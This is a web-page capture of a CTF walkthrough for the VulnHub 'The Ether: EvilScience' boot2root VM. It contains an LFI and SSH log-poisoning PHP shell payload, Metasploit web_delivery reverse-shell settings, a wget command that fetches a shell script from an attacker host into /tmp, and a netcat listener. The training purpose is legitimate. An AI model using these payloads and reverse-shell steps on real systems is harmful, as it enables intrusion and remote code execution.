<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack The Ether: EvilScience VM (CTF Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-ether-evilscience-vm-ctf-challenge/" rel="bookmark"><time class="entry-date published" datetime="2017-11-30T15:08:36+00:00">November 30, 2017</time><time class="updated" datetime="2025-06-10T20:29:55+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as The Ether: EvilScience. The credit for making this vm machine goes to “f1re_w1re” and it is another boot2root challenge where we have to root the server to complete the challenge. You can download this VM <a style="color: #000000;" href="http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong>Let’s Breach!!!</strong></span></p>
<p><span style="color: #000000;">Let us start form getting to know the IP of VM (Here, I have it at <strong>192.168.1.146 </strong>but you will have to find your own)</span></p>
<p><span style="color: #000000;"><strong>netdiscover</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-HvK0p5GAACI/WiAYEl04xXI/AAAAAAAASjw/_YtCruKa_9k9ICq5R6CnLX76jJwnVwTwwCEwYBhgL/s1600/1.1.png"/></span></p>
<p><span style="color: #000000;">Use nmap for port enumeration.</span></p>
<p><span style="color: #000000;"><strong>nmap -sV 192.168.1.146</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4TzpYr3W64o/WiAYEg5faII/AAAAAAAASjw/teBBnBAIN8sLgg3Zlq9Nzqf_00yOyPC9ACEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Nmap scan shows us port 80 is open, so we open the ip address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-v1oofbOmtt4/WiAYImNWrCI/AAAAAAAASjw/QnW-UVrBV8osUUHyXFwbB0n7sz_v1cAegCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">We find that the site is vulnerable to LFI. Going through the pages we find that the index.php file is vulnerable to LFI</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-RIdbI4w2pdA/WiAYJfkocqI/AAAAAAAASjw/s8Dlc7Fl0Do5Aktuu1jRV_eIZCqLyqpdwCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">We can access auth.log with LFI. We use burpsuite to check the response and we find that we can use ssh log poisoning to get access to server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zr1aeqw2K6s/WiAYJW3ed6I/AAAAAAAASjw/fK3O3OdJnQcDoM5Bw3pc5-4ZnWKmCqFywCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We now login with username as basic php shell to use command injection.</span></p>
<p><span style="color: #000000;"><strong>ssh ‘&lt;?php system($_GET[‘C’]);?&gt;’@192.168.1.146</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qUGcWGUOi-U/WiAYQTd6SNI/AAAAAAAASjw/tUjhH37pU7gmzmuu8hZtPI-D7Q7x427TQCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now we check if log injection is possible we try to run ‘ls’ command and find that log injection is possible.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SUJvQBnX4Es/WiAYQ5I31NI/AAAAAAAASjw/O36x2Bl9EFI6M6mrgL7q5n50GlYkQge3gCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We use web_delivery script in metasploit to gain reverse shell.</span></p>
<p><span style="color: #000000;"><strong>msf &gt; use multi/script/web_delivery</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit(web_delivery) &gt; set target 1</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit(web_delivery) &gt; set payload php/meterpreter/reverse_tcp</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit(web_delivery) &gt; set lhost 192.168.1.131</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit(web_delivery) &gt; set lport 4444</strong></span></p>
<p><span style="color: #000000;"><strong>msf exploit(web_delivery) &gt; run</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SC4bXFWQ3Xs/WiAYQ6ypqhI/AAAAAAAASjw/n4FXkzwomQ0d2mTOR_hMrsa8dMPpNNCwACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we run python to run our web delivery script to bypass the firewall.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-WY4y6wX65TA/WiAYRcLYlQI/AAAAAAAASjw/JiqPstD8_sIlt24pBBkof3Ex82LJpHSJQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">As soon as we get send the request we get the reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-HIYeXdWoWd4/WiAYRhrdh7I/AAAAAAAASjw/DQaBTjY6TPUXqn_WBI162KP2gseXHq6ZQCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now we spawn tty shell with python.</span></p>
<p><span style="color: #000000;"><strong>python -c ‘import pty; pty.spawn(“/bin/bash”);’</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ntftfc_7idg/WiAYEgbC5bI/AAAAAAAASjw/W4zhGEClqSUaPZydP-FG1djSGAfvjmFKwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">Now we take look at the sudoers file. We find that we don’t need need password to run a python file as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-01v9TiSz_OI/WiAYFmzuF5I/AAAAAAAASjw/l740vdswgbMaazDLcYd1-suW4XW-3YXvgCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">Now we run the file as root. When we run the file we find that it opens log file so we use pipe to run our commands. We run id command and find that we can execute commands as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-8_OiUW32B6E/WiAYGKxBOGI/AAAAAAAASjw/EXY1SdiNVNQGVBXJmZM85X-MMnfUaOZ-gCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now we setup our listener using netcat.</span></p>
<p><span style="color: #000000;"><strong>nc -lvp 5555</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2rgbCVPYoLM/WiAYGUOZKhI/AAAAAAAASjw/_kVMDnWkb8IkjghUf7IFJb_ZzY4E5ji1QCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Now we create a python shell and save it into our /var/www/html folder.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-G0SROyUA-2Q/WiAYGr_7QeI/AAAAAAAASjw/b4hb4hanrbM9XCGjdVrcN0qntgtvOuy-wCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We download it inside /tmp folder on the target VM using wget.</span></p>
<p><span style="color: #000000;"><strong>wget </strong><strong>http://192.168.1.108/shell.py</strong><strong> -O /tmp/shell.py</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-P7LIWuObNWI/WiAYHElZe5I/AAAAAAAASi8/qmqr82-akx0PcIe19egflPKLmR5vZWN7ACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Let’s run the shell using python program in the target machine.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3WzevtLq890/WiAYHeNnc2I/AAAAAAAASjA/QeGF2NnCO0wvbedxmpDtqTwPfo8atO7IwCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now as soon as we run the shell we get the reverse shell. We run the id command to check the user. We move to the root directory and find an image file called flag.png</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-u453SlWeHEs/WiAYHtBqheI/AAAAAAAASjw/lOhXSZnP-NwK2z5ig6c3oBtl_xhbwnd0wCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We check the strings inside the image using tail command.</span></p>
<p><span style="color: #000000;"><strong>tail flag.png</strong></span></p>
<p><span style="color: #000000;">Inside the image file we find a flag in base64 encode.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RNaMRaer2Ig/WiAYIEdcZyI/AAAAAAAASjI/6FwlPnKMK_QUJf2WTNYWBPlUXIIVa0G4QCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We decode the base64 encoded string.</span></p>
<p><span style="color: #000000;"><strong>echo ‘base64-encoded-string’ | base64 -d</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-64DORVd4kHY/WiAYIPgd7BI/AAAAAAAASjw/leBWThry3x8eJGh476kVW8y9rDockCcUACEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
